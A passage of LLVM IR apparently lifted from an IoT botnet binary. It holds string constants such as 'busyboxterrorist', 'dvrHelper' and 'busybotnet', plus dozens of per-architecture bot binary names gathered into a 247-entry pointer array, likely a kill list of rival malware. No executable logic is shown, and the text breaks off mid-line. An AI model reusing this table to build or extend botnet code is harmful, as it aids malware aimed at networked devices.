@global_var_10018784.394 = constant [4 x i8] c"b13\00"
@global_var_10018788.395 = constant [4 x i8] c"b14\00"
@global_var_1001878c.396 = constant [4 x i8] c"b15\00"
@global_var_10018790.397 = constant [4 x i8] c"b16\00"
@global_var_10018794.398 = constant [4 x i8] c"b17\00"
@global_var_10018798.399 = constant [4 x i8] c"b18\00"
@global_var_1001879c.400 = constant [4 x i8] c"b19\00"
@global_var_100187a0.401 = constant [4 x i8] c"b20\00"
@global_var_100187a4.402 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_100187b8.403 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_100187c4.404 = constant [10 x i8] c"dvrHelper\00"
@global_var_100187d0.405 = constant [8 x i8] c"FDFDHFC\00"
@global_var_100187d8.406 = constant [5 x i8] c"FEUB\00"
@global_var_100187e0.407 = constant [9 x i8] c"FTUdftui\00"
@global_var_100187ec.408 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_100187f8.409 = constant [6 x i8] c"jhUOH\00"
@global_var_10018800.410 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1001880c.411 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_10018818.412 = constant [8 x i8] c"kmymips\00"
@global_var_10018820.413 = constant [10 x i8] c"kmymips64\00"
@global_var_1001882c.414 = constant [10 x i8] c"kmymipsel\00"
@global_var_10018838.415 = constant [9 x i8] c"kmysh2eb\00"
@global_var_10018844.416 = constant [10 x i8] c"kmysh2elf\00"
@global_var_10018850.417 = constant [7 x i8] c"kmysh4\00"
@global_var_10018858.418 = constant [7 x i8] c"kmyx86\00"
@global_var_10018860.419 = constant [9 x i8] c"kmyarmv5\00"
@global_var_1001886c.420 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_10018878.421 = constant [9 x i8] c"kmyarmv4\00"
@global_var_10018884.422 = constant [9 x i8] c"kmyarmv6\00"
@global_var_10018890.423 = constant [8 x i8] c"kmyi686\00"
@global_var_10018898.424 = constant [11 x i8] c"kmypowerpc\00"
@global_var_100188a4.425 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_100188b4.426 = constant [8 x i8] c"kmyi586\00"
@global_var_100188bc.427 = constant [8 x i8] c"kmym68k\00"
@global_var_100188c4.428 = constant [9 x i8] c"kmysparc\00"
@global_var_100188d0.429 = constant [10 x i8] c"kmyx86_64\00"
@global_var_100188dc.430 = constant [8 x i8] c"lolmips\00"
@global_var_100188e4.431 = constant [10 x i8] c"lolmips64\00"
@global_var_100188f0.432 = constant [10 x i8] c"lolmipsel\00"
@global_var_100188fc.433 = constant [9 x i8] c"lolsh2eb\00"
@global_var_10018908.434 = constant [10 x i8] c"lolsh2elf\00"
@global_var_10018914.435 = constant [7 x i8] c"lolsh4\00"
@global_var_1001891c.436 = constant [7 x i8] c"lolx86\00"
@global_var_10018924.437 = constant [9 x i8] c"lolarmv5\00"
@global_var_10018930.438 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_1001893c.439 = constant [9 x i8] c"lolarmv4\00"
@global_var_10018948.440 = constant [9 x i8] c"lolarmv6\00"
@global_var_10018954.441 = constant [8 x i8] c"loli686\00"
@global_var_1001895c.442 = constant [11 x i8] c"lolpowerpc\00"
@global_var_10018968.443 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_10018978.444 = constant [8 x i8] c"loli586\00"
@global_var_10018980.445 = constant [8 x i8] c"lolm68k\00"
@global_var_10018988.446 = constant [9 x i8] c"lolsparc\00"
@global_var_10018994.447 = constant [8 x i8] c"RYrydry\00"
@global_var_1001899c.448 = constant [8 x i8] c"telmips\00"
@global_var_100189a4.449 = constant [10 x i8] c"telmips64\00"
@global_var_100189b0.450 = constant [10 x i8] c"telmipsel\00"
@global_var_100189bc.451 = constant [9 x i8] c"telsh2eb\00"
@global_var_100189c8.452 = constant [10 x i8] c"telsh2elf\00"
@global_var_100189d4.453 = constant [7 x i8] c"telsh4\00"
@global_var_100189dc.454 = constant [7 x i8] c"telx86\00"
@global_var_100189e4.455 = constant [9 x i8] c"telarmv5\00"
@global_var_100189f0.456 = constant [11 x i8] c"telarmv4tl\00"
@global_var_100189fc.457 = constant [9 x i8] c"telarmv4\00"
@global_var_10018a08.458 = constant [9 x i8] c"telarmv6\00"
@global_var_10018a14.459 = constant [8 x i8] c"teli686\00"
@global_var_10018a1c.460 = constant [11 x i8] c"telpowerpc\00"
@global_var_10018a28.461 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_10018a38.462 = constant [8 x i8] c"teli586\00"
@global_var_10018a40.463 = constant [8 x i8] c"telm68k\00"
@global_var_10018a48.464 = constant [9 x i8] c"telsparc\00"
@global_var_10018a54.465 = constant [10 x i8] c"telx86_64\00"
@global_var_10018a60.466 = constant [12 x i8] c"TwoFacemips\00"
@global_var_10018a6c.467 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_10018a7c.468 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_10018a8c.469 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_10018a9c.470 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_10018aac.471 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_10018ab8.472 = constant [11 x i8] c"TwoFacex86\00"
@global_var_10018ac4.473 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_10018ad4.474 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_10018ae4.475 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_10018af4.476 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_10018b04.477 = constant [12 x i8] c"TwoFacei686\00"
@global_var_10018b10.478 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_10018b20.479 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_10018b34.480 = constant [12 x i8] c"TwoFacei586\00"
@global_var_10018b40.481 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_10018b4c.482 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_10018b5c.483 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_10018b6c.484 = constant [9 x i8] c"UYyuyioy\00"
@global_var_10018b78.485 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_10018b84.486 = constant [5 x i8] c"xxb1\00"
@global_var_10018b8c.487 = constant [5 x i8] c"xxb2\00"
@global_var_10018b94.488 = constant [5 x i8] c"xxb3\00"
@global_var_10018b9c.489 = constant [5 x i8] c"xxb4\00"
@global_var_10018ba4.490 = constant [5 x i8] c"xxb5\00"
@global_var_10018bac.491 = constant [5 x i8] c"xxb6\00"
@global_var_10018bb4.492 = constant [5 x i8] c"xxb7\00"
@global_var_10018bbc.493 = constant [5 x i8] c"xxb8\00"
@global_var_10018bc4.494 = constant [5 x i8] c"xxb9\00"
@global_var_10018bcc.495 = constant [6 x i8] c"xxb10\00"
@global_var_10018bd4.496 = constant [6 x i8] c"xxb11\00"
@global_var_10018bdc.497 = constant [6 x i8] c"xxb12\00"
@global_var_10018be4.498 = constant [6 x i8] c"xxb13\00"
@global_var_10018bec.499 = constant [6 x i8] c"xxb14\00"
@global_var_10018bf4.500 = constant [6 x i8] c"xxb15\00"
@global_var_10018bfc.501 = constant [6 x i8] c"xxb16\00"
@global_var_10018c04.502 = constant [6 x i8] c"xxb17\00"
@global_var_10018c0c.503 = constant [6 x i8] c"xxb18\00"
@global_var_10018c14.504 = constant [6 x i8] c"xxb19\00"
@global_var_10018c1c.505 = constant [6 x i8] c"xxb20\00"
@global_var_10018c24.506 = constant i32 822083584
@global_var_10018c28.507 = constant i32 838860800
@global_var_10018c2c.508 = constant i32 855638016
@global_var_10018c30.509 = constant i32 872415232
@global_var_10018c34.510 = constant i32 889192448
@global_var_10018c38.511 = constant i32 905969664
@global_var_10018c3c.512 = constant i32 922746880
@global_var_10018c40.513 = constant i32 939524096
@global_var_10018c44.514 = constant i32 956301312
@global_var_10018c48.515 = constant [3 x i8] c"10\00"
@global_var_10018c4c.516 = constant [3 x i8] c"11\00"
@global_var_10018c50.517 = constant [3 x i8] c"12\00"
@global_var_10018c54.518 = constant [3 x i8] c"13\00"
@global_var_10018c58.519 = constant [3 x i8] c"14\00"
@global_var_10018c5c.520 = constant [3 x i8] c"15\00"
@global_var_10018c60.521 = constant [3 x i8] c"16\00"
@global_var_10018c64.522 = constant [3 x i8] c"17\00"
@global_var_10018c68.523 = constant [3 x i8] c"18\00"
@global_var_10018c6c.524 = constant [3 x i8] c"19\00"
@global_var_10018c70.525 = constant [3 x i8] c"20\00"
@global_var_10018c74.526 = constant [3 x i8] c"bb\00"
@global_var_10018c78.527 = constant [11 x i8] c"busybotnet\00"
@global_var_10018c84.528 = constant [5 x i8] c"pppd\00"
@global_var_10018c8c.529 = constant [6 x i8] c"pppoe\00"
@global_var_10018c94.530 = constant [5 x i8] c"wput\00"
@global_var_10018c9c.531 = constant [3 x i8] c"B1\00"
@global_var_10018ca0.532 = constant [3 x i8] c"B2\00"
@global_var_10018ca4.533 = constant [3 x i8] c"B3\00"
@global_var_10018ca8.534 = constant [3 x i8] c"B4\00"
@global_var_10018cac.535 = constant [3 x i8] c"B5\00"
@global_var_10018cb0.536 = constant [3 x i8] c"B6\00"
@global_var_10018cb4.537 = constant [3 x i8] c"B7\00"
@global_var_10018cb8.538 = constant [3 x i8] c"B8\00"
@global_var_10018cbc.539 = constant [3 x i8] c"B9\00"
@global_var_10018cc0.540 = constant [4 x i8] c"B10\00"
@global_var_10018cc4.541 = constant [4 x i8] c"B11\00"
@global_var_10018cc8.542 = constant [4 x i8] c"B12\00"
@global_var_10018ccc.543 = constant [4 x i8] c"B13\00"
@global_var_10018cd0.544 = constant [4 x i8] c"B14\00"
@global_var_10018cd4.545 = constant [4 x i8] c"B15\00"
@global_var_10018cd8.546 = constant [4 x i8] c"B16\00"
@global_var_10018cdc.547 = constant [4 x i8] c"B17\00"
@global_var_10018ce0.548 = constant [4 x i8] c"B18\00"
@global_var_10018ce4.549 = constant [4 x i8] c"B20\00"
@global_var_10018ce8.550 = constant [10 x i8] c"dvrhelper\00"
@global_var_10018cf4.551 = constant [247 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018494.311, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001849c.312, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100177d8.313, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100184a4.314, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100177ec.315, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100184ac.316, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100184b4.317, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100177b0.318, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017790.319, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100184bc.320, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100184c0.321, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100177d0.322, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100177e0.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017798.324, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100184c8.325, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100184cc.326, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100184d4.327, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100184dc.328, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100184e0.329, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100184e4.330, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100184ec.331, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100184f0.332, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100184cc.326, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100184f8.333, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100184d4.327, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018500.334, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10018508.335, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100184dc.328, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100184e0.329, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018510.336, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018514.337, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001851c.338, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018524.339, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001852c.340, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100184e4.330, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10018534.341, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001853c.342, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100184f0.332, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001854c.343, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018554.344, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001855c.345, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018564.346, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018570.347, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018580.348, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018590.349, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001859c.350, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100185ac.351, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100185b8.352, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100185c4.353, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100185d0.354, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100185e0.355, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100185ec.356, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100185f8.357, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10018604.358, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_10018614.359, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018628.360, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018634.361, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018640.362, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001864c.363, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001865c.364, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018668.365, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018678.366, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018688.367, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018694.368, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100186a4.369, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100186b0.370, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100186bc.371, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100186c8.372, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100186d8.373, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100186e4.374, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100186f0.375, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100186fc.376, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1001870c.377, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018720.378, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001872c.379, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018738.380, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018744.381, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018754.382, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018758.383, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1001875c.384, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018760.385, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018764.386, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018768.387, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1001876c.388, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018770.389, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018774.390, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018778.391, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001877c.392, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018780.393, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018784.394, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018788.395, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001878c.396, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018790.397, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018794.398, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018798.399, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001879c.400, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100187a0.401, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_100187a4.402, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100187b8.403, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100187c4.404, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100187d0.405, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100187d8.406, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100187e0.407, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100187ec.408, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100187f8.409, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018800.410, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001880c.411, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10018818.412, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10018820.413, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001882c.414, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018838.415, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10018844.416, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10018850.417, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10018858.418, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018860.419, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001886c.420, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018878.421, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018884.422, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10018890.423, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018898.424, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_100188a4.425, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100188b4.426, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100188bc.427, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100188c4.428, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100188d0.429, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100188dc.430, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100188e4.431, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100188f0.432, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100188fc.433, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10018908.434, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10018914.435, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001891c.436, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018924.437, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018930.438, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001893c.439, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018948.440, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10018954.441, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001895c.442, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10018968.443, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10018978.444, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10018980.445, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018988.446, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10018994.447, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001899c.448, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100189a4.449, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100189b0.450, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100189bc.451, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100189c8.452, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100189d4.453, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100189dc.454, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100189e4.455, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100189f0.456, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100189fc.457, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018a08.458, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10018a14.459, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018a1c.460, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10018a28.461, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10018a38.462, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10018a40.463, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018a48.464, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10018a54.465, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018a60.466, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10018a6c.467, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10018a7c.468, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018a8c.469, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10018a9c.470, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018aac.471, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018ab8.472, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018ac4.473, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10018ad4.474, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018ae4.475, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018af4.476, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018b04.477, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10018b10.478, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_10018b20.479, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018b34.480, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018b40.481, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018b4c.482, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10018b5c.483, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018b6c.484, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001855c.345, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018b78.485, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018b84.486, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018b8c.487, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018b94.488, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018b9c.489, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018ba4.490, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018bac.491, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018bb4.492, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018bbc.493, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018bc4.494, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018bcc.495, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018bd4.496, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018bdc.497, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018be4.498, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018bec.499, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018bf4.500, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018bfc.501, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* 